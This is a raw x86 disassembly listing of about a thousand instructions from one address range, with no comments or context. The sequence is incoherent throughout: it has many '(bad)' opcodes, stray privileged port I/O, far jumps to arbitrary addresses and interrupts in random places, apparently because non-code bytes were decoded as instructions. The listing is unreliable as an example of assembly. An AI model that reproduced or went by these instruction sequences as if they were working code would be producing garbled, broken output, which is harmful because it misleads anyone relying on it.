  47ce4c:	jns    0x47ce42
  47ce4e:	adc    BYTE PTR [edx+esi*4],bl
  47ce51:	and    eax,0x18201906
  47ce56:	inc    ecx
  47ce57:	fmulp  st(0),st
  47ce59:	fwait
  47ce5a:	inc    esp
  47ce5b:	jne    0x47ce61
  47ce5d:	sub    al,BYTE PTR [edx]
  47ce5f:	call   0x905e97a
  47ce64:	sbb    ch,dh
  47ce66:	add    eax,0x90a52473
  47ce6b:	mov    eax,0x4f075946
  47ce70:	je     0x47ceea
  47ce72:	fiadd  WORD PTR [eax]
  47ce74:	test   BYTE PTR [eax],bl
  47ce76:	sub    BYTE PTR [esp+edx*2+0x50b4360d],dh
  47ce7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47ce7e:	sbb    bh,BYTE PTR [ebp-0x27]
  47ce81:	pop    esp
  47ce82:	mov    ch,0x65
  47ce84:	sbb    BYTE PTR [ecx],ch
  47ce86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47ce87:	dec    ebp
  47ce88:	adc    al,0xbf
  47ce8a:	iret   
  47ce8b:	es mov bh,0xba
  47ce8e:	and    esp,esp
  47ce90:	jecxz  0x47ceac
  47ce92:	add    BYTE PTR [edx-0x1],al
  47ce95:	sub    BYTE PTR [ebx+0x5e],dh
  47ce98:	aaa    
  47ce99:	daa    
  47ce9a:	les    edi,FWORD PTR [edx]
  47ce9c:	loopne 0x47ced2
  47ce9e:	or     al,0xb
  47cea0:	inc    edx
  47cea1:	adc    bh,BYTE PTR [edx-0x77bf47e8]
  47cea7:	add    DWORD PTR [ebp+0x26],esi
  47ceaa:	scas   eax,DWORD PTR es:[edi]
  47ceab:	or     al,0x85
  47cead:	shl    BYTE PTR [edx+0x75],0xc4
  47ceb1:	out    dx,al
  47ceb2:	or     al,0x80
  47ceb4:	mov    al,ds:0x26176c4b
  47ceb9:	out    0xed,al
  47cebb:	daa    
  47cebc:	aas    
  47cebd:	fbld   TBYTE PTR [esp+eax*8-0x7d]
  47cec1:	or     eax,0x2cb847b0
  47cec6:	sbb    cl,BYTE PTR [ecx+0x6e]
  47cec9:	xor    BYTE PTR [edi],ah
  47cecb:	outs   dx,DWORD PTR ds:[esi]
  47cecc:	fadd   QWORD PTR [ebx]
  47cece:	and    al,0xfd
  47ced0:	inc    ecx
  47ced1:	adc    eax,0xc7cc3ecb
  47ced6:	inc    eax
  47ced7:	inc    ebp
  47ced8:	imul   BYTE PTR [esi]
  47ceda:	add    DWORD PTR [ebp-0x58],esi
  47cedd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47cede:	loope  0x47cef1
  47cee0:	sub    ah,BYTE PTR [esi]
  47cee2:	and    esi,DWORD PTR [esi-0x18]
  47cee5:	ja     0x47ce8f
  47cee7:	ins    DWORD PTR es:[edi],dx
  47cee8:	or     BYTE PTR [ecx+0x4a91190e],dl
  47ceee:	jno    0x47cf21
  47cef0:	scas   al,BYTE PTR es:[edi]
  47cef1:	pop    eax
  47cef2:	lock es or al,0xb8
  47cef6:	lea    esi,[eax+0x18]
  47cef9:	add    DWORD PTR [edi],0x4a
  47cefc:	xchg   ecx,eax
  47cefd:	jle    0x47cf09
  47ceff:	adc    ebx,DWORD PTR [edx+edx*4]
  47cf02:	fisubr DWORD PTR [esi]
  47cf04:	iret   
  47cf05:	dec    ebx
  47cf06:	inc    ebp
  47cf07:	push   ss
  47cf08:	and    BYTE PTR [eax],cl
  47cf0a:	lods   eax,DWORD PTR ds:[esi]
  47cf0b:	pop    ds
  47cf0c:	or     ch,BYTE PTR [esi+0x3b]
  47cf0f:	ss (bad) 
  47cf11:	fistp  DWORD PTR [edx]
  47cf13:	int3   
  47cf14:	sub    BYTE PTR [edi+0x554a1a06],ah
  47cf1a:	imul   ecx,DWORD PTR [edx],0xffffff8c
  47cf1d:	loopne 0x47cf3b
  47cf1f:	(bad)  
  47cf20:	fmul   st(6),st
  47cf22:	mov    dl,0xa6
  47cf24:	shr    BYTE PTR [edx+0x54040424],1
  47cf2a:	sbb    dl,BYTE PTR [ebx]
  47cf2c:	das    
  47cf2d:	add    DWORD PTR [edi],ecx
  47cf2f:	mov    ah,ch
  47cf31:	and    DWORD PTR [esi-0x25],0x72
  47cf35:	xchg   ecx,eax
  47cf36:	(bad)  [eax-0xb58c128]
  47cf3c:	cmp    esi,DWORD PTR [edx+eax*1-0x35]
  47cf40:	mov    edi,esp
  47cf42:	pusha  
  47cf43:	stos   BYTE PTR es:[edi],al
  47cf44:	add    BYTE PTR [esi],dl
  47cf46:	in     al,0xc8
  47cf48:	push   esi
  47cf49:	fiadd  WORD PTR [edx+0x760090be]
  47cf4f:	and    eax,0x3faf1f74
  47cf54:	sbb    BYTE PTR [esi+0x384bc301],dh
  47cf5a:	inc    ecx
  47cf5b:	cmp    bl,ch
  47cf5d:	and    edx,eax
  47cf5f:	rcr    DWORD PTR ds:0x6d0a3102,0x24
  47cf66:	ins    DWORD PTR es:[edi],dx
  47cf67:	(bad)  
  47cf69:	out    dx,eax
  47cf6a:	sbb    esp,DWORD PTR [ecx-0x111345c0]
  47cf70:	jle    0x47cf06
  47cf72:	loop   0x47cf5f
  47cf74:	cmp    eax,0x10f8806f
  47cf79:	je     0x47cf84
  47cf7b:	mov    WORD PTR [eax],ss
  47cf7d:	loopne 0x47cf9d
  47cf7f:	pop    ecx
  47cf80:	mov    BYTE PTR [eax+0x27],bl
  47cf83:	lds    ebx,FWORD PTR [esi]
  47cf85:	adc    BYTE PTR [ecx],al
  47cf87:	mov    bh,0x4b
  47cf89:	lock inc esp
  47cf8b:	jmp    0xfa623b0c
  47cf90:	inc    eax
  47cf91:	mov    ecx,0xd61e780c
  47cf96:	push   ecx
  47cf97:	xor    eax,0xe3ed9b6a
  47cf9c:	push   esp
  47cf9d:	nop
  47cf9e:	mov    ds:0x41bfc075,eax
  47cfa3:	cmp    al,0xc3
  47cfa5:	xchg   eax,ecx
  47cfa7:	inc    edi
  47cfa8:	push   edi
  47cfa9:	mov    bl,0x3b
  47cfab:	test   DWORD PTR [ecx+eiz*2-0x8],edi
  47cfaf:	or     DWORD PTR [esi],ebx
  47cfb1:	je     0x47cffc
  47cfb3:	dec    ecx
  47cfb4:	cmp    eax,DWORD PTR [ebp-0x80]
  47cfb7:	jne    0x47cff7
  47cfb9:	mov    ch,0x6b
  47cfbb:	inc    ebp
  47cfbc:	jo     0x47cf99
  47cfbe:	jbe    0x47cff4
  47cfc0:	xchg   ebp,eax
  47cfc1:	test   al,0x87
  47cfc3:	jp     0x47cf6a
  47cfc5:	add    al,0x4b
  47cfc7:	loope  0x47cfb4
  47cfc9:	lock sbb eax,0xa38f1bb4
  47cfcf:	xchg   ebx,eax
  47cfd0:	sub    ebp,DWORD PTR [edx]
  47cfd2:	jmp    0x3763ebf7
  47cfd7:	pop    ds
  47cfd8:	lock pop ds
  47cfda:	rcl    al,1
  47cfdc:	add    BYTE PTR [eax-0x55],0x43
  47cfe0:	fst    DWORD PTR [edx-0x2e0d92]
  47cfe6:	sbb    edi,DWORD PTR [edx+0x285ebe40]
  47cfec:	ins    DWORD PTR es:[edi],dx
  47cfed:	hlt    
  47cfee:	imul   ebx,DWORD PTR [ebx],0x6f
  47cff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47cff2:	sbb    esi,DWORD PTR [esi-0x39]
  47cff5:	jg     0x47cfdf
  47cff7:	xor    dl,BYTE PTR [edi]
  47cff9:	mov    eax,0xcb1b986b
  47cffe:	push   ebx
  47cfff:	xor    DWORD PTR [eax+ecx*1+0x5da254b5],ecx
  47d006:	and    BYTE PTR [eax],0x83
  47d009:	(bad)  
  47d00a:	mov    dl,0x36
  47d00c:	in     eax,dx
  47d00d:	fdiv   DWORD PTR [ebx]
  47d00f:	sbb    cl,BYTE PTR [ebp+0x49]
  47d012:	add    al,0xe1
  47d014:	mov    ebp,0x1d0b276d
  47d019:	inc    esp
  47d01a:	sub    esp,DWORD PTR [ecx-0x648e8fa7]
  47d020:	mov    dh,0x9c
  47d022:	inc    edx
  47d023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47d024:	inc    ebp
  47d025:	in     al,0xa1
  47d027:	mov    ah,0x33
  47d029:	mov    esp,0x5707a23a
  47d02e:	lock pop ss
  47d030:	pusha  
  47d031:	pop    ds
  47d032:	adc    al,0x34
  47d034:	xchg   DWORD PTR [edx],edx
  47d036:	cmp    edx,esp
  47d038:	mov    DWORD PTR [esi+0x7b],edi
  47d03b:	jo     0x47d05e
  47d03d:	adc    al,0x2b
  47d03f:	loop   0x47cfce
  47d041:	mov    al,ds:0x5f806a02
  47d046:	push   ds
  47d047:	and    al,0xe4
  47d049:	jmp    0x47d06b
  47d04b:	push   0xba263a62
  47d050:	mov    cs,WORD PTR [ecx-0x4f2e95dd]
  47d056:	dec    ebx
  47d057:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47d059:	ret    
  47d05a:	shl    BYTE PTR [ebp+0x31],1
  47d05d:	loopne 0x47d06e
  47d05f:	outs   dx,BYTE PTR ds:[esi]
  47d060:	jmp    0x5f791c9a
  47d065:	loopne 0x47d044
  47d067:	mov    esi,eax
  47d069:	ret    
  47d06a:	inc    esi
  47d06b:	dec    esi
  47d06c:	jp     0x47d085
  47d06e:	sbb    ah,al
  47d070:	fcom   DWORD PTR ds:0xc14721b8
  47d076:	push   cs
  47d077:	ja     0x47d0ed
  47d079:	xor    bh,ch
  47d07b:	loopne 0x47d000
  47d07d:	and    esp,DWORD PTR [ecx]
  47d07f:	sbb    ebp,DWORD PTR [edi+0x43]
  47d082:	dec    ebp
  47d083:	(bad)  
  47d084:	cmp    eax,0x7922b822
  47d089:	push   esi
  47d08a:	cwde   
  47d08b:	dec    DWORD PTR [edx+ebp*2]
  47d08e:	call   DWORD PTR [ebx-0x6f]
  47d091:	dec    eax
  47d092:	add    al,0xc7
  47d094:	stc    
  47d095:	push   esi
  47d096:	inc    ebp
  47d097:	test   DWORD PTR [edx-0x7d],edi
  47d09a:	push   ecx
  47d09b:	std    
  47d09c:	mov    ?,WORD PTR ds:0x39c7f949
  47d0a2:	ss out dx,eax
  47d0a4:	cmp    ebx,DWORD PTR [edi-0x95f0d3]
  47d0aa:	jb     0x47d098
  47d0ac:	xchg   esi,eax
  47d0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47d0ae:	int3   
  47d0af:	push   ebx
  47d0b0:	jecxz  0x47d041
  47d0b2:	shl    DWORD PTR [eax-0x1e2ca72f],0x51
  47d0b9:	test   BYTE PTR [ecx+0x187b3661],dl
  47d0bf:	lock pusha 
  47d0c1:	push   0x36
  47d0c3:	lock pop ebp
  47d0c5:	jge    0x47d0e8
  47d0c7:	cwde   
  47d0c8:	sbb    al,0x61
  47d0ca:	xor    ebx,eax
  47d0cc:	jg     0x47d0f0
  47d0ce:	call   0x2a09523c
  47d0d3:	add    dh,al
  47d0d5:	into   
  47d0d6:	(bad)  
  47d0d7:	lock adc DWORD PTR [esi+eiz*1+0x61],esp
  47d0dc:	(bad)  
  47d0dd:	iret   
  47d0de:	lock or al,0x2c
  47d0e1:	mov    al,ds:0x1340ddd7
  47d0e6:	mov    ?,WORD PTR [esi]
  47d0e8:	mov    ds:0x35ca467e,al
  47d0ed:	add    cl,BYTE PTR [esi+0x4343b43]
  47d0f3:	jmp    0xf767e8b
  47d0f8:	add    edx,DWORD PTR [ecx-0xf9fb47b]
  47d0fe:	outs   dx,BYTE PTR ds:[esi]
  47d0ff:	push   es
  47d100:	ret    
  47d101:	dec    ebx
  47d102:	pusha  
  47d103:	(bad)  
  47d104:	ror    BYTE PTR [ebp+0xe],0x4
  47d108:	int3   
  47d109:	push   ebp
  47d10a:	add    al,BYTE PTR [ecx]
  47d10c:	or     BYTE PTR [ecx],dh
  47d10e:	push   0x11
  47d110:	imul   edx,DWORD PTR [edi-0x15],0x647429
  47d117:	neg    DWORD PTR [eax-0x1a]
  47d11a:	adc    DWORD PTR [esi],0x45627836
  47d120:	nop
  47d121:	dec    edx
  47d122:	(bad)  [esi]
  47d124:	shr    BYTE PTR [ebx+0x1c],cl
  47d127:	and    DWORD PTR [edi],esp
  47d129:	jae    0x47d158
  47d12b:	shl    BYTE PTR [edx],0x44
  47d12e:	sahf   
  47d12f:	or     ah,BYTE PTR [ebx-0x71]
  47d132:	add    al,BYTE PTR [edx+0xf]
  47d135:	or     bh,dl
  47d137:	stos   BYTE PTR es:[edi],al
  47d138:	mov    al,0xcf
  47d13a:	mov    ecx,0x1d849e07
  47d13f:	mov    ecx,0xe4ad94ec
  47d144:	in     al,0x7
  47d146:	fsubr  st(0),st
  47d148:	mov    edi,DWORD PTR [esi]
  47d14a:	add    eax,esi
  47d14c:	rol    BYTE PTR [esi],0x9e
  47d14f:	hlt    
  47d150:	in     al,0x81
  47d152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47d153:	pop    ds
  47d154:	push   edi
  47d155:	in     al,0xa2
  47d157:	lods   eax,DWORD PTR ds:[esi]
  47d158:	inc    dx
  47d15a:	addr16 mov cl,0xf0
  47d15d:	nop
  47d15e:	inc    ebx
  47d15f:	sbb    cl,BYTE PTR [ebp*8-0xb36b50e]
  47d166:	and    eax,0x95e0d047
  47d16b:	push   0xffffffb8
  47d16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47d16e:	mov    BYTE PTR cs:[ebp-0x11],0x1
  47d173:	pop    edi
  47d174:	test   al,0xc6
  47d176:	cdq    
  47d177:	mov    BYTE PTR [esi-0x57],dh
  47d17a:	or     dh,0xfb
  47d17d:	jmp    0xae60144a
  47d182:	fdiv   DWORD PTR [esi]
  47d184:	add    al,0x3a
  47d186:	push   edx
  47d187:	(bad)  
  47d189:	pop    ecx
  47d18a:	popf   
  47d18b:	cwde   
  47d18c:	call   0xe88efbaf
  47d191:	cmp    al,0xcb
  47d193:	dec    ebx
  47d194:	mov    bl,0x87
  47d196:	sub    al,dh
  47d198:	lock inc ebp
  47d19a:	stos   DWORD PTR es:[edi],eax
  47d19b:	int    0x8a
  47d19d:	frstor [esi+0xab44fad]
  47d1a3:	outs   dx,BYTE PTR ds:[esi]
  47d1a4:	imul   esp,DWORD PTR es:[eax+0x142df0ab],0x80f78109
  47d1af:	jge    0x47d1a0
  47d1b1:	loopne 0x47d1d3
  47d1b3:	adc    cl,BYTE PTR [edx+0x4e87532c]
  47d1b9:	cs in  eax,dx
  47d1bb:	(bad)  
  47d1bc:	(bad)  
  47d1bd:	cwde   
  47d1be:	sti    
  47d1bf:	out    dx,eax
  47d1c0:	js     0x47d1a6
  47d1c2:	in     al,0x1f
  47d1c4:	out    0x58,eax
  47d1c6:	sbb    ah,BYTE PTR [ecx+0x61]
  47d1c9:	xchg   esi,eax
  47d1ca:	rcl    DWORD PTR [ecx],cl
  47d1cc:	das    
  47d1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47d1ce:	mov    al,0x9
  47d1d0:	jmp    0x47d1bf
  47d1d2:	or     ebx,DWORD PTR [eax]
  47d1d4:	xchg   ebp,eax
  47d1d5:	and    DWORD PTR [ebx-0x69fc27c9],0x1fc0887e
  47d1df:	add    eax,esp
  47d1e1:	clc    
  47d1e2:	mov    DWORD PTR [edi+0x43],0x62f8db36
  47d1e9:	and    BYTE PTR [edx-0x2ffb433c],dl
  47d1ef:	test   esi,0xe7f92877
  47d1f5:	hlt    
  47d1f6:	cmp    BYTE PTR ds:0x5d02ecc4,0x2d
  47d1fd:	loopne 0x47d1dd
  47d1ff:	xchg   edi,eax
  47d200:	ins    BYTE PTR es:[edi],dx
  47d201:	(bad)
  47d205:	or     bh,dl
  47d207:	(bad)  
  47d208:	sub    BYTE PTR [eax-0x7214bb23],dl
  47d20e:	clc    
  47d20f:	push   cs
  47d210:	sub    al,0x28
  47d212:	xor    BYTE PTR es:[ecx+ebp*8],dl
  47d216:	sub    al,0x8d
  47d218:	pop    es
  47d219:	test   al,0x14
  47d21b:	sbb    ebp,DWORD PTR [edi]
  47d21d:	cmc    
  47d21e:	sub    BYTE PTR ds:0x1dbd24de,dl
  47d224:	imul   esp,DWORD PTR [esi+edi*4],0xffffffc9
  47d228:	shr    DWORD PTR [esi+0x78da868],0x8c
  47d22f:	or     eax,edi
  47d231:	add    al,0x4
  47d233:	daa    
  47d234:	jo     0x47d232
  47d236:	add    al,0x87
  47d238:	push   ss
  47d239:	ss jmp 0x47d219
  47d23c:	add    DWORD PTR [eax],ebx
  47d23e:	jg     0x47d249
  47d240:	and    DWORD PTR [edi],edi
  47d242:	sub    BYTE PTR [edx+0x5cd22146],cl
  47d248:	pop    edx
  47d249:	sub    ebx,ecx
  47d24b:	and    DWORD PTR [edx],esp
  47d24d:	xor    al,0x34
  47d24f:	cmp    BYTE PTR [eax+0x60c2a4a2],ah
  47d255:	inc    eax
  47d256:	jbe    0x47d2c9
  47d258:	dec    eax
  47d259:	add    DWORD PTR [esp+edx*2-0x58],edx
  47d25d:	ret    
  47d25e:	adc    DWORD PTR es:[ecx-0x3d6be48],eax
  47d265:	sub    DWORD PTR [ecx+0xbdc1624],ebp
  47d26b:	call   0xc6cff97d
  47d270:	push   cs
  47d271:	or     ecx,DWORD PTR [edi]
  47d273:	push   ss
  47d274:	inc    edx
  47d275:	mov    eax,0x22ad7fcf
  47d27a:	or     dl,BYTE PTR [ecx-0x80]
  47d27d:	js     0x47d2cb
  47d27f:	adc    al,0x85
  47d281:	aaa    
  47d282:	push   eax
  47d283:	adc    DWORD PTR [ebp+edx*8+0x4fa45f75],eax
  47d28a:	dec    eax
  47d28b:	or     eax,0xa2f89171
  47d290:	push   ecx
  47d291:	mov    ecx,0xea59eb15
  47d296:	jmp    0x7bdd:0xc3056660
  47d29d:	adc    BYTE PTR [esi],bl
  47d29f:	push   edx
  47d2a0:	mov    al,0x35
  47d2a2:	fmul   st(3),st
  47d2a4:	cmp    esi,DWORD PTR ds:0xf1227b87
  47d2aa:	xchg   BYTE PTR [edx+0x15adb4f8],al
  47d2b0:	xor    DWORD PTR [esi+ebp*2],eax
  47d2b3:	lock sub al,0x48
  47d2b6:	ret    0x9646
  47d2b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47d2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47d2bb:	add    DWORD PTR [eax-0x2c6338e6],esi
  47d2c1:	xchg   ah,ch
  47d2c3:	sub    BYTE PTR ds:0x51704002,0x36
  47d2ca:	add    BYTE PTR [ebx],cl
  47d2cc:	sahf   
  47d2cd:	or     eax,0xbc3aa951
  47d2d2:	jno    0x47d2c6
  47d2d4:	jmp    DWORD PTR [esi]
  47d2d6:	clc    
  47d2d7:	inc    ecx
  47d2d8:	sar    ah,cl
  47d2da:	ins    BYTE PTR es:[edi],dx
  47d2db:	sub    al,0x6
  47d2dd:	pop    esp
  47d2de:	cld    
  47d2df:	sbb    ecx,DWORD PTR [eax+0x472ac17b]
  47d2e5:	dec    ecx
  47d2e6:	imul   esp
  47d2e8:	mov    ah,0x1
  47d2ea:	push   cs
  47d2eb:	je     0x47d2e4
  47d2ed:	fcom   DWORD PTR [eax+0x9]
  47d2f0:	push   esp
  47d2f1:	add    eax,0x7d
  47d2f4:	pop    ss
  47d2f5:	pop    esp
  47d2f6:	ror    BYTE PTR [edi],0xfa
  47d2f9:	mov    BYTE PTR [eax+0x31],0xa6
  47d2fd:	loope  0x47d32f
  47d2ff:	ret    
  47d300:	lahf   
  47d301:	dec    edx
  47d302:	(bad)  
  47d303:	mov    dh,BYTE PTR ds:0x12c455d8
  47d309:	cmp    dl,ch
  47d30b:	mov    edi,0x4e338819
  47d310:	pushf  
  47d311:	sbb    al,al
  47d313:	(bad)  
  47d314:	xchg   ecx,eax
  47d315:	sub    BYTE PTR [esi+0x18],dl
  47d318:	(bad)  
  47d319:	or     eax,0x3118536f
  47d31e:	pop    esi
  47d31f:	adc    ebx,esp
  47d321:	rcr    al,1
  47d323:	pop    ebx
  47d324:	adc    al,0x31
  47d326:	(bad)  
  47d327:	retf   0x24cd
  47d32a:	mov    eax,0xaf54e0b8
  47d32f:	push   esi
  47d330:	push   ebp
  47d331:	test   eax,0x5480dca
  47d336:	mov    ecx,0xd921e417
  47d33b:	das    
  47d33c:	or     esi,DWORD PTR [ecx+0x73]
  47d33f:	pop    eax
  47d340:	mov    eax,ds:0x521a30e3
  47d345:	inc    edx
  47d346:	mov    ebx,0xf18436c3
  47d34b:	loopne 0x47d31e
  47d34d:	ret    
  47d34e:	scas   eax,DWORD PTR es:[edi]
  47d34f:	inc    esi
  47d350:	adc    BYTE PTR [ebp+0x3e93484b],dh
  47d356:	and    bh,BYTE PTR [eax]
  47d358:	sbb    eax,0xc40631b1
  47d35d:	mov    eax,0x8623a28c
  47d362:	adc    eax,0xac48c358
  47d367:	push   cs
  47d368:	sbb    eax,0xec05dfb7
  47d36d:	hlt    
  47d36e:	imul   edx
  47d370:	jle    0x47d3f1
  47d372:	(bad)  
  47d373:	movzx  edx,WORD PTR [esi+0x2a]
  47d377:	push   es
  47d378:	dec    esi
  47d379:	sub    BYTE PTR [edi],cl
  47d37b:	leave  
  47d37c:	xchg   esi,eax
  47d37d:	dec    ecx
  47d37e:	(bad)  
  47d37f:	scas   eax,DWORD PTR es:[edi]
  47d380:	ror    DWORD PTR [edx-0xa],1
  47d383:	shr    BYTE PTR [edx],0x8e
  47d386:	or     edi,DWORD PTR [eax]
  47d388:	and    al,0xef
  47d38a:	lds    ebx,FWORD PTR [eax]
  47d38c:	push   0x4
  47d38e:	sbb    esi,DWORD PTR [eax+esi*4]
  47d391:	fwait
  47d392:	popf   
  47d393:	pop    eax
  47d394:	and    BYTE PTR [ebx],bh
  47d396:	repz push es
  47d398:	dec    ebx
  47d399:	pop    eax
  47d39a:	mov    eax,0x88081f5a
  47d39f:	popa   
  47d3a0:	stc    
  47d3a1:	sub    BYTE PTR [edx],ah
  47d3a3:	adc    BYTE PTR [edx+0x3],ch
  47d3a6:	and    BYTE PTR [ebx+0x64],bh
  47d3a9:	daa    
  47d3aa:	mov    ecx,ebx
  47d3ac:	test   BYTE PTR [ecx+0x43],ch
  47d3af:	fadd   QWORD PTR [edi]
  47d3b1:	fwait
  47d3b2:	mov    eax,ds:0x28cdadf9
  47d3b7:	pop    es
  47d3b8:	gs int3 
  47d3ba:	or     eax,0xf0c82db1
  47d3bf:	clc    
  47d3c0:	ins    BYTE PTR es:[edi],dx
  47d3c1:	add    ebx,edi
  47d3c3:	inc    edi
  47d3c4:	mov    edx,0xe18e0261
  47d3c9:	mov    ebp,0x717195e8
  47d3ce:	adc    BYTE PTR [eax],dl
  47d3d0:	inc    ebx
  47d3d1:	fucomp st(0)
  47d3d3:	or     BYTE PTR [edx+0x1],dl
  47d3d6:	aaa    
  47d3d7:	xchg   edx,eax
  47d3d8:	mov    ds:0x160bcce8,al
  47d3dd:	sbb    esp,esp
  47d3df:	sub    eax,DWORD PTR [edi]
  47d3e1:	dec    esp
  47d3e2:	inc    edi
  47d3e3:	or     al,0x2b
  47d3e5:	inc    edi
  47d3e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47d3e7:	cmp    eax,0xe7c9d854
  47d3ec:	inc    esi
  47d3ed:	sbb    al,0x50
  47d3ef:	pop    esi
  47d3f0:	and    BYTE PTR [ecx],cl
  47d3f2:	mov    al,BYTE PTR [esp+edi*4+0x1f]
  47d3f6:	dec    esi
  47d3f7:	pop    ss
  47d3f8:	mov    ds:0x25c4d88,eax
  47d3fd:	cs adc al,0x4f
  47d400:	mov    al,0x5
  47d402:	add    bl,ah
  47d404:	(bad)  
  47d406:	mov    ebp,0x1d780d37
  47d40b:	lahf   
  47d40c:	or     DWORD PTR ds:0x583d653,ebx
  47d412:	imul   ecx,ebx,0xffffffd9
  47d415:	and    BYTE PTR [ebx+0x15f11c46],dh
  47d41b:	or     eax,0x2f82dd0c
  47d420:	adc    eax,DWORD PTR [edi]
  47d422:	mov    eax,DWORD PTR [eax+0x5f]
  47d425:	push   0xe3e98e7e
  47d42a:	cmp    BYTE PTR [ebp-0x9],0x12
  47d42e:	cmp    al,0x92
  47d431:	jo     0x47d44e
  47d433:	adc    al,0xe7
  47d435:	aad    0xe0
  47d437:	cmp    eax,0x376c61ca
  47d43c:	xchg   edi,eax
  47d43d:	bound  ebx,QWORD PTR [esi+0x28]
  47d440:	in     al,dx
  47d441:	adc    esp,eax
  47d443:	sub    ah,al
  47d445:	add    DWORD PTR [esi+0x27],edi
  47d448:	shr    DWORD PTR [eax+eax*4],cl
  47d44b:	jnp    0x47d4be
  47d44d:	sub    BYTE PTR [esi+eax*2+0x7fb32c26],0x53
  47d455:	(bad)  
  47d457:	inc    eax
  47d458:	add    eax,eax
  47d45a:	enter  0x39b6,0xf4
  47d45e:	repz dec edx
  47d460:	arpl   WORD PTR [ecx],ax
  47d462:	adc    BYTE PTR [ecx+0x25],0x3
  47d466:	cmc    
  47d467:	cdq    
  47d468:	shl    BYTE PTR [eax],0x47
  47d46b:	rcpps  xmm3,XMMWORD PTR [ebx]
  47d46e:	inc    eax
  47d46f:	push   0xffffffd8
  47d471:	sub    ch,BYTE PTR [ecx]
  47d473:	lea    edx,[edi+0x4]
  47d476:	xchg   BYTE PTR [ecx],cl
  47d478:	sub    al,0x37
  47d47a:	sub    BYTE PTR [eax],bl
  47d47c:	nop
  47d47d:	daa    
  47d47e:	pushf  
  47d47f:	pop    ebp
  47d480:	cmp    DWORD PTR [ebp+ecx*2+0x63],0x6c8af2
  47d488:	(bad)  
  47d489:	jnp    0x47d4b7
  47d48b:	shl    BYTE PTR [edi+0x2b],0x40
  47d48f:	jno    0x47d489
  47d491:	sbb    DWORD PTR [eax],ebp
  47d493:	pop    DWORD PTR [eax-0xb20adc2]
  47d499:	push   ds
  47d49a:	add    DWORD PTR [ebx+0x0],esp
  47d49d:	mov    ebx,0x5e18e694
  47d4a2:	sub    al,0x6a
  47d4a4:	mov    ebp,0x1089a1fe
  47d4a9:	mov    al,ds:0x46c7345e
  47d4ae:	xor    ah,bh
  47d4b0:	jbe    0x47d478
  47d4b2:	xchg   ebp,eax
  47d4b3:	or     bh,BYTE PTR [eax+0x34]
  47d4b6:	pop    es
  47d4b7:	rcl    DWORD PTR [ebp+ebp*8+0x3a8fd806],0x11
  47d4bf:	hlt    
  47d4c0:	clc    
  47d4c1:	inc    esp
  47d4c2:	rol    BYTE PTR [edi-0x43],0xb4
  47d4c6:	adc    dh,al
  47d4c8:	mov    WORD PTR [eax+0x8],ss
  47d4cb:	loope  0x47d48e
  47d4cd:	pop    ds
  47d4ce:	sbb    esp,ebp
  47d4d0:	cmp    edx,DWORD PTR [eax+0x14]
  47d4d3:	jne    0x47d4ec
  47d4d5:	sbb    ecx,DWORD PTR [esi]
  47d4d7:	sub    al,0x12
  47d4d9:	loope  0x47d528
  47d4db:	neg    DWORD PTR [esi]
  47d4dd:	jmp    0x47d4e8
  47d4df:	cwde   
  47d4e0:	add    DWORD PTR [ebp-0x5e484b9c],ebx
  47d4e6:	jbe    0x47d4cb
  47d4e8:	inc    ecx
  47d4e9:	in     al,0x41
  47d4eb:	sub    BYTE PTR [ebx+0x3f],cl
  47d4ee:	pop    ebp
  47d4ef:	xchg   ebx,eax
  47d4f0:	outs   dx,DWORD PTR ds:[esi]
  47d4f1:	(bad)  
  47d4f2:	jmp    0x187de196
  47d4f7:	mov    al,ds:0x3e198051
  47d4fc:	mov    es,WORD PTR [edi]
  47d4fe:	repnz fiadd DWORD PTR [edx-0x52fe01d5]
  47d505:	pop    edi
  47d506:	sti    
  47d507:	sub    al,0x1e
  47d509:	loope  0x47d51b
  47d50b:	jmp    0x7546:0x3d34c710
  47d512:	sub    al,0x7a
  47d514:	or     DWORD PTR [esi-0x75],eax
  47d517:	in     eax,dx
  47d518:	fwait
  47d519:	xchg   BYTE PTR [edx],ch
  47d51b:	sbb    al,0x27
  47d51d:	push   0x10
  47d51f:	pop    ds
  47d520:	ja     0x47d542
  47d522:	dec    eax
  47d523:	jecxz  0x47d4e8
  47d525:	inc    ecx
  47d526:	shr    BYTE PTR [ecx-0x35e8a606],0x11
  47d52d:	je     0x47d597
  47d52f:	sbb    BYTE PTR [ebx],ch
  47d531:	adc    al,BYTE PTR [edx]
  47d533:	jg     0x47d54d
  47d535:	mov    ecx,DWORD PTR [edi]
  47d537:	das    
  47d538:	mov    ds:0x7258771c,al
  47d53d:	rcr    BYTE PTR [esi+0x6f],0xa0
  47d541:	mov    ah,0x65
  47d543:	dec    ecx
  47d544:	pop    edi
  47d545:	fist   WORD PTR [edx+esi*8]
  47d548:	adc    al,BYTE PTR [ebp-0x2e]
  47d54b:	mov    al,ds:0x437a18b4
  47d550:	or     bl,al
  47d552:	cmp    dl,BYTE PTR [eax-0x23]
  47d555:	sbb    al,0x84
  47d557:	pop    eax
  47d558:	(bad)  
  47d559:	fs inc ebx
  47d55b:	or     ecx,ecx
  47d55d:	sub    DWORD PTR [ebx+eax*1+0x22],0xa984d35
  47d565:	or     BYTE PTR [eax],cl
  47d567:	mov    al,0x6b
  47d569:	pop    ss
  47d56a:	test   eax,0x1866de75
  47d56f:	adc    BYTE PTR [edx+ecx*2+0x12],dh
  47d573:	data16 and al,0xe
  47d576:	ja     0x47d57f
  47d578:	fcom   QWORD PTR [eax]
  47d57a:	fisttp DWORD PTR [eax+0x73]
  47d57d:	adc    BYTE PTR [edx],al
  47d57f:	test   cl,ch
  47d581:	shl    BYTE PTR [edi],0x2
  47d584:	mov    ah,BYTE PTR [eax-0x4a7bd329]
  47d58a:	jp     0x47d54d
  47d58c:	xor    edx,eax
  47d58e:	mov    bh,0x28
